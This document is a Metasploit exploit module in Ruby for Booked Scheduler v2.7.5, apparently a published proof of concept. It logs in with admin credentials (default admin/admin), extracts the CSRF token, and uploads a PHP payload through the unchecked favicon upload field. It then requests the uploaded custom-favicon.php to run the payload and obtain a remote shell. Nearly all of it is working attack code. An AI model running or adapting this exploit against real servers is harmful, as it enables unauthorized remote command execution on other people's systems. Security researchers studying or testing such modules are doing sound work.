# This module requires Metasploit: http://metasploit.com/download 
# Current source: https://github.com/rapid7/metasploit-framework 
## 
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking 
 
  include Msf::Exploit::Remote::HttpClient 
 
    def initialize 
    super( 
      &#039;Name&#039;           => &#039;Booked Scheduler v2.7.5 - Remote Command Execution&#039;, 
      &#039;Description&#039;    => %q{ 
        This module exploits a file upload vulnerability Booked 2.7.5. 
        In the "Look and Feel" section of the management panel, you can modify the Logo-Favico-CSS files.  
        Upload sections has file extension control except favicon part.
        You can upload the file with the extension you want through the Favicon field.
        The file you upload is written to the main directory of the site under the name "custom-favicon". 
        After upload the php payload to the main directory, Exploit executes payload and receives shell.  
      }, 
      &#039;Author&#039;         => [ 
        &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Vulnerability Discovery, PoC & Msf Module 
        ], 
      &#039;License&#039;        => MSF_LICENSE, 
      &#039;References&#039;     => 
        [
          [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/Booked-2-7-5-Remote-Command-Execution-Metasploit.html&#039;],  
        ], 
      &#039;Platform&#039;       => [&#039;php&#039;], 
      &#039;Arch&#039;           => ARCH_PHP, 
      &#039;Targets&#039;        => 
        [ 
          [&#039;Booked Scheduler v2.7.5&#039;, {}] 
        ], 
      &#039;DisclosureDate&#039; => &#039;01 March 2019&#039;, 
      &#039;Privileged&#039;     => false,       
      &#039;DefaultTarget&#039; => 0 
    ) 
 
    register_options( 
        [ 
          OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, false]),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Booked&#039;, &#039;/&#039;]), 
          OptString.new(&#039;USER&#039;, [true, &#039;User to login with&#039;, &#039;admin&#039;]), 
          OptString.new(&#039;PASS&#039;, [true, &#039;Password to login with&#039;, &#039;admin&#039;]), 
        ], self.class) 
    end 
##
# Check Exploit Vulnerable
##  
  def check
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;GET&#039;,  
      &#039;uri&#039;    => normalize_uri(target_uri, "/Web/index.php")      
    })

   if res and res.code == 200 and res.body =~ /v2.7.5/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
    return res 
  end  
##
# Exploit Portion
##  
  def exploit 
    res = send_request_cgi({ 
      &#039;method&#039; => &#039;POST&#039;, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/Web/index.php"), 
      &#039;vars_post&#039; => { 
          "email" => datastore[&#039;USER&#039;], 
          "password" => datastore[&#039;PASS&#039;],
          "captcha" => "",
          "resume" => "",
          "language" => "en_us",
          "login" => "submit" 
           
      } 
    })

   if res and res.code == 302
      print_status("Successful redirection to admin dashboard.")
    else
      return res
    end
 
    get_cookie = res.get_cookies 
    cookie = get_cookie 
##
# Login Access Control
##
    control = send_request_cgi({ 
      &#039;method&#039; => &#039;GET&#039;, 
      &#039;cookie&#039; => cookie, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/Web/dashboard.php")      
    })

    html = control.body
    if html =~ /Dashboard/
      print_good("Login successfuly")
    else
      print_status("User information is incorrect. Login failed")
      exit 0
    end 
##
# Reading CSRF Token
##
    csrf = send_request_cgi({ 
      &#039;method&#039; => &#039;GET&#039;, 
      &#039;cookie&#039; => cookie, 
      &#039;uri&#039;    => normalize_uri(target_uri, "/Web/admin/manage_theme.php")      
    })

    html = control.body
    if html =~ /Look and Feel/
      token = csrf.body.split(&#039;CSRF_TOKEN" value=&#039;)[1].split(";")[0].split(&#039;/&#039;)[0].split(&#039;"&#039;)[1]
      print_status("CSRF Token = #{token}")
    else
      print_status("User information is incorrect. Login failed")
      exit 0
    end 
##
# Loading phase of the vulnerable file
##
    boundary = Rex::Text.rand_text_alphanumeric(29)

    data2 = "-----------------------------{boundary}"
    data2 << "\r\nContent-Disposition: form-data; name=\"LOGO_FILE\"\r\n\r\n\r\n"
    data2 << "-----------------------------{boundary}"
    data2 << "\r\nContent-Disposition: form-data; name=\"FAVICON_FILE\"; filename=\"akkus.php\""
    data2 << "\r\nContent-Type: text/html\r\n\r\n"
    data2 << payload.encoded
    data2 << "\n\r\n-----------------------------{boundary}"
    data2 << "\r\nContent-Disposition: form-data; name=\"CSS_FILE\"\r\n\r\n\r\n"
    data2 << "-----------------------------{boundary}"
    data2 << "\r\nContent-Disposition: form-data; name=\"CSRF_TOKEN\"\r\n\r\n"
    data2 << "#{token}"
    data2 << "\r\n-----------------------------{boundary}--\r\n"

    res = send_request_raw(
      {
        &#039;method&#039; => "POST",
        &#039;uri&#039;     => normalize_uri(target_uri, "/Web/admin/manage_theme.php?action=update"),
        &#039;data&#039; => data2,
        &#039;headers&#039; =>
        {
          &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;,
        },
        &#039;cookie&#039;  => cookie
      })

    if res and res.code == 200
      print_good "Payload was successfully uploaded."
    else
      print_error "Upload failed."
      return
    end 
##
# Command execution and shell retrieval
##
    print_status("Attempting to execute the payload...")

    command = payload.encoded

    res = send_request_cgi(
      {
        &#039;uri&#039;     => normalize_uri(target_uri, "/Web/custom-favicon.php"),
        &#039;cookie&#039;  => cookie
      }, 25)


    if res and res.code == 200
      print_good "Payload executed successfully"
    end    
  end     
end
##
# End
##

